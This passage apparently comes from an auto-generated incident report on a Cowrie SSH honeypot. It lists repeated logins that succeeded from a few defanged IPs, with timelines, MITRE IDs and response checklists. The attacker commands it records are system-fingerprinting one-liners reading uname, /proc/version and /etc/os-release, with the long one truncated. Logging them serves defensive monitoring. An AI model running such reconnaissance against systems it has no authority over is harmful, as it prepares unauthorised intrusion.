| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 02:32:47` | `cowrie.session.connect` |
| `2026-08-16 02:32:48` | `cowrie.client.version` |
| `2026-08-16 02:32:48` | `cowrie.client.kex` |
| `2026-08-16 02:32:50` | `cowrie.login.success` |
| `2026-08-16 02:32:52` | `cowrie.session.params` |
| `2026-08-16 02:32:52` | `cowrie.command.input` |
| `2026-08-16 02:32:52` | `cowrie.command.input` |
| `2026-08-16 02:32:52` | `cowrie.command.input` |
| `2026-08-16 02:32:52` | `cowrie.command.input` |
| `2026-08-16 02:32:52` | `cowrie.command.input` |
| `2026-08-16 02:32:52` | `cowrie.command.success` |
| `2026-08-16 02:32:52` | `cowrie.command.input` |
| `2026-08-16 02:32:52` | `cowrie.command.input` |
| `2026-08-16 02:32:52` | `cowrie.command.input` |
| `2026-08-16 02:32:52` | `cowrie.command.input` |
| `2026-08-16 02:32:52` | `cowrie.log.closed` |
| `2026-08-16 02:32:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc7c2061f24b

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 02:33 |
| **Last Seen** | 2026-08-16 02:33 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 02:33:44` | `cowrie.session.connect` |
| `2026-08-16 02:33:44` | `cowrie.client.version` |
| `2026-08-16 02:33:44` | `cowrie.client.kex` |
| `2026-08-16 02:33:45` | `cowrie.login.success` |
| `2026-08-16 02:33:47` | `cowrie.session.params` |
| `2026-08-16 02:33:47` | `cowrie.command.input` |
| `2026-08-16 02:33:47` | `cowrie.command.input` |
| `2026-08-16 02:33:47` | `cowrie.command.input` |
| `2026-08-16 02:33:47` | `cowrie.command.input` |
| `2026-08-16 02:33:47` | `cowrie.command.input` |
| `2026-08-16 02:33:47` | `cowrie.command.success` |
| `2026-08-16 02:33:47` | `cowrie.command.input` |
| `2026-08-16 02:33:47` | `cowrie.command.input` |
| `2026-08-16 02:33:47` | `cowrie.command.input` |
| `2026-08-16 02:33:47` | `cowrie.command.input` |
| `2026-08-16 02:33:47` | `cowrie.log.closed` |
| `2026-08-16 02:33:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-35c4c46a550d

| Field | Detail |
|---|---|
| **Source IP** | `217.165.22[.]192` |
| **First Seen** | 2026-08-16 02:33 |
| **Last Seen** | 2026-08-16 02:33 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 02:33:52` | `cowrie.session.connect` |
| `2026-08-16 02:33:52` | `cowrie.client.version` |
| `2026-08-16 02:33:52` | `cowrie.client.kex` |
| `2026-08-16 02:33:53` | `cowrie.login.success` |
| `2026-08-16 02:33:54` | `cowrie.session.params` |
| `2026-08-16 02:33:54` | `cowrie.command.input` |
| `2026-08-16 02:33:54` | `cowrie.log.closed` |
| `2026-08-16 02:33:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.165.22[.]192` to AbuseIPDB if not already reported
- [ ] Block `217.165.22[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-571bbe419802

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 02:34 |
| **Last Seen** | 2026-08-16 02:34 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 02:34:37` | `cowrie.session.connect` |
| `2026-08-16 02:34:37` | `cowrie.client.version` |
| `2026-08-16 02:34:37` | `cowrie.client.kex` |
| `2026-08-16 02:34:39` | `cowrie.login.success` |
| `2026-08-16 02:34:41` | `cowrie.session.params` |
| `2026-08-16 02:34:41` | `cowrie.command.input` |
| `2026-08-16 02:34:41` | `cowrie.command.input` |
| `2026-08-16 02:34:41` | `cowrie.command.input` |
| `2026-08-16 02:34:41` | `cowrie.command.input` |
| `2026-08-16 02:34:41` | `cowrie.command.input` |
| `2026-08-16 02:34:41` | `cowrie.command.success` |
| `2026-08-16 02:34:41` | `cowrie.command.input` |
| `2026-08-16 02:34:41` | `cowrie.command.input` |
| `2026-08-16 02:34:41` | `cowrie.command.input` |
| `2026-08-16 02:34:41` | `cowrie.command.input` |
| `2026-08-16 02:34:41` | `cowrie.log.closed` |
| `2026-08-16 02:34:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f883b6d88dd

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 02:35 |
| **Last Seen** | 2026-08-16 02:35 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 02:35:32` | `cowrie.session.connect` |
| `2026-08-16 02:35:32` | `cowrie.client.version` |
| `2026-08-16 02:35:32` | `cowrie.client.kex` |
| `2026-08-16 02:35:34` | `cowrie.login.success` |
| `2026-08-16 02:35:36` | `cowrie.session.params` |
| `2026-08-16 02:35:36` | `cowrie.command.input` |
| `2026-08-16 02:35:36` | `cowrie.command.input` |
| `2026-08-16 02:35:36` | `cowrie.command.input` |
| `2026-08-16 02:35:36` | `cowrie.command.input` |
| `2026-08-16 02:35:36` | `cowrie.command.input` |
| `2026-08-16 02:35:36` | `cowrie.command.success` |
| `2026-08-16 02:35:36` | `cowrie.command.input` |
| `2026-08-16 02:35:36` | `cowrie.command.input` |
| `2026-08-16 02:35:36` | `cowrie.command.input` |
| `2026-08-16 02:35:36` | `cowrie.command.input` |
| `2026-08-16 02:35:36` | `cowrie.log.closed` |
| `2026-08-16 02:35:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25fe9b616544

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 02:36 |
| **Last Seen** | 2026-08-16 02:36 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 02:36:24` | `cowrie.session.connect` |
| `2026-08-16 02:36:25` | `cowrie.client.version` |
| `2026-08-16 02:36:25` | `cowrie.client.kex` |
| `2026-08-16 02:36:27` | `cowrie.login.success` |
| `2026-08-16 02:36:28` | `cowrie.session.params` |
| `2026-08-16 02:36:28` | `cowrie.command.input` |
| `2026-08-16 02:36:28` | `cowrie.command.input` |
| `2026-08-16 02:36:28` | `cowrie.command.input` |
| `2026-08-16 02:36:28` | `cowrie.command.input` |
| `2026-08-16 02:36:28` | `cowrie.command.input` |
| `2026-08-16 02:36:28` | `cowrie.command.success` |
| `2026-08-16 02:36:28` | `cowrie.command.input` |
| `2026-08-16 02:36:28` | `cowrie.command.input` |
| `2026-08-16 02:36:28` | `cowrie.command.input` |
| `2026-08-16 02:36:28` | `cowrie.command.input` |
| `2026-08-16 02:36:29` | `cowrie.log.closed` |
| `2026-08-16 02:36:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-465be7fa70ac

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 02:37 |
| **Last Seen** | 2026-08-16 02:37 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 02:37:19` | `cowrie.session.connect` |
| `2026-08-16 02:37:19` | `cowrie.client.version` |
| `2026-08-16 02:37:19` | `cowrie.client.kex` |
| `2026-08-16 02:37:21` | `cowrie.login.success` |
| `2026-08-16 02:37:22` | `cowrie.session.params` |
| `2026-08-16 02:37:22` | `cowrie.command.input` |
| `2026-08-16 02:37:22` | `cowrie.command.input` |
| `2026-08-16 02:37:22` | `cowrie.command.input` |
| `2026-08-16 02:37:22` | `cowrie.command.input` |
| `2026-08-16 02:37:22` | `cowrie.command.input` |
| `2026-08-16 02:37:22` | `cowrie.command.success` |
| `2026-08-16 02:37:22` | `cowrie.command.input` |
| `2026-08-16 02:37:22` | `cowrie.command.input` |
| `2026-08-16 02:37:22` | `cowrie.command.input` |
| `2026-08-16 02:37:22` | `cowrie.command.input` |
| `2026-08-16 02:37:23` | `cowrie.log.closed` |
| `2026-08-16 02:37:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-369c1fcfe2f1

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 02:38 |
| **Last Seen** | 2026-08-16 02:38 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 02:38:15` | `cowrie.session.connect` |
| `2026-08-16 02:38:15` | `cowrie.client.version` |
| `2026-08-16 02:38:15` | `cowrie.client.kex` |
| `2026-08-16 02:38:18` | `cowrie.login.success` |
| `2026-08-16 02:38:19` | `cowrie.session.params` |
| `2026-08-16 02:38:19` | `cowrie.command.input` |
| `2026-08-16 02:38:19` | `cowrie.command.input` |
| `2026-08-16 02:38:19` | `cowrie.command.input` |
| `2026-08-16 02:38:19` | `cowrie.command.input` |
| `2026-08-16 02:38:19` | `cowrie.command.input` |
| `2026-08-16 02:38:19` | `cowrie.command.success` |
| `2026-08-16 02:38:19` | `cowrie.command.input` |
| `2026-08-16 02:38:19` | `cowrie.command.input` |
| `2026-08-16 02:38:19` | `cowrie.command.input` |
| `2026-08-16 02:38:19` | `cowrie.command.input` |
| `2026-08-16 02:38:19` | `cowrie.log.closed` |
| `2026-08-16 02:38:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-724e35012f61

| Field | Detail |
|---|---|
| **Source IP** | `185.74.59[.]14` |
| **First Seen** | 2026-08-16 02:38 |
| **Last Seen** | 2026-08-16 02:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 02:38:37` | `cowrie.session.connect` |
| `2026-08-16 02:38:37` | `cowrie.client.version` |
| `2026-08-16 02:38:37` | `cowrie.client.kex` |
| `2026-08-16 02:38:37` | `cowrie.login.success` |
| `2026-08-16 02:38:38` | `cowrie.session.params` |
| `2026-08-16 02:38:38` | `cowrie.command.input` |
| `2026-08-16 02:38:38` | `cowrie.log.closed` |
| `2026-08-16 02:38:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.74.59[.]14` to AbuseIPDB if not already reported
- [ ] Block `185.74.59[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f4230acaf6c

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 02:39 |
| **Last Seen** | 2026-08-16 02:39 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 02:39:11` | `cowrie.session.connect` |
| `2026-08-16 02:39:12` | `cowrie.client.version` |
| `2026-08-16 02:39:12` | `cowrie.client.kex` |
| `2026-08-16 02:39:13` | `cowrie.login.success` |
| `2026-08-16 02:39:14` | `cowrie.session.params` |
| `2026-08-16 02:39:14` | `cowrie.command.input` |
| `2026-08-16 02:39:14` | `cowrie.command.input` |
| `2026-08-16 02:39:14` | `cowrie.command.input` |
| `2026-08-16 02:39:14` | `cowrie.command.input` |
| `2026-08-16 02:39:14` | `cowrie.command.input` |
| `2026-08-16 02:39:14` | `cowrie.command.success` |
| `2026-08-16 02:39:14` | `cowrie.command.input` |
| `2026-08-16 02:39:14` | `cowrie.command.input` |
| `2026-08-16 02:39:14` | `cowrie.command.input` |
| `2026-08-16 02:39:14` | `cowrie.command.input` |
| `2026-08-16 02:39:15` | `cowrie.log.closed` |
| `2026-08-16 02:39:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-85b48e18ebcb

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 02:40 |
| **Last Seen** | 2026-08-16 02:40 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 02:40:07` | `cowrie.session.connect` |
| `2026-08-16 02:40:07` | `cowrie.client.version` |
| `2026-08-16 02:40:07` | `cowrie.client.kex` |
| `2026-08-16 02:40:08` | `cowrie.login.success` |
| `2026-08-16 02:40:10` | `cowrie.session.params` |
| `2026-08-16 02:40:10` | `cowrie.command.input` |
| `2026-08-16 02:40:10` | `cowrie.command.input` |
| `2026-08-16 02:40:10` | `cowrie.command.input` |
| `2026-08-16 02:40:10` | `cowrie.command.input` |
| `2026-08-16 02:40:10` | `cowrie.command.input` |
| `2026-08-16 02:40:10` | `cowrie.command.success` |
| `2026-08-16 02:40:10` | `cowrie.command.input` |
| `2026-08-16 02:40:10` | `cowrie.command.input` |
| `2026-08-16 02:40:10` | `cowrie.command.input` |
| `2026-08-16 02:40:10` | `cowrie.command.input` |
| `2026-08-16 02:40:11` | `cowrie.log.closed` |
| `2026-08-16 02:40:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23c180e67913

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 02:41 |
| **Last Seen** | 2026-08-16 02:41 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 02:41:04` | `cowrie.session.connect` |
| `2026-08-16 02:41:04` | `cowrie.client.version` |
| `2026-08-16 02:41:04` | `cowrie.client.kex` |
| `2026-08-16 02:41:06` | `cowrie.login.success` |
| `2026-08-16 02:41:07` | `cowrie.session.params` |
| `2026-08-16 02:41:07` | `cowrie.command.input` |
| `2026-08-16 02:41:07` | `cowrie.command.input` |
| `2026-08-16 02:41:07` | `cowrie.command.input` |
| `2026-08-16 02:41:07` | `cowrie.command.input` |
| `2026-08-16 02:41:07` | `cowrie.command.input` |
| `2026-08-16 02:41:07` | `cowrie.command.success` |
| `2026-08-16 02:41:07` | `cowrie.command.input` |
| `2026-08-16 02:41:07` | `cowrie.command.input` |
| `2026-08-16 02:41:07` | `cowrie.command.input` |
| `2026-08-16 02:41:07` | `cowrie.command.input` |
| `2026-08-16 02:41:07` | `cowrie.log.closed` |
| `2026-08-16 02:41:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a07e40ee40b1

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 02:41 |
| **Last Seen** | 2026-08-16 02:42 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 02:41:59` | `cowrie.session.connect` |
| `2026-08-16 02:41:59` | `cowrie.client.version` |
| `2026-08-16 02:41:59` | `cowrie.client.kex` |
| `2026-08-16 02:42:01` | `cowrie.login.success` |
| `2026-08-16 02:42:03` | `cowrie.session.params` |
| `2026-08-16 02:42:03` | `cowrie.command.input` |
| `2026-08-16 02:42:03` | `cowrie.command.input` |
| `2026-08-16 02:42:03` | `cowrie.command.input` |
| `2026-08-16 02:42:03` | `cowrie.command.input` |
| `2026-08-16 02:42:03` | `cowrie.command.input` |
| `2026-08-16 02:42:03` | `cowrie.command.success` |
| `2026-08-16 02:42:03` | `cowrie.command.input` |
| `2026-08-16 02:42:03` | `cowrie.command.input` |
| `2026-08-16 02:42:03` | `cowrie.command.input` |
| `2026-08-16 02:42:03` | `cowrie.command.input` |
| `2026-08-16 02:42:03` | `cowrie.log.closed` |
| `2026-08-16 02:42:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b5a7b94a872

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 02:42 |
| **Last Seen** | 2026-08-16 02:42 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
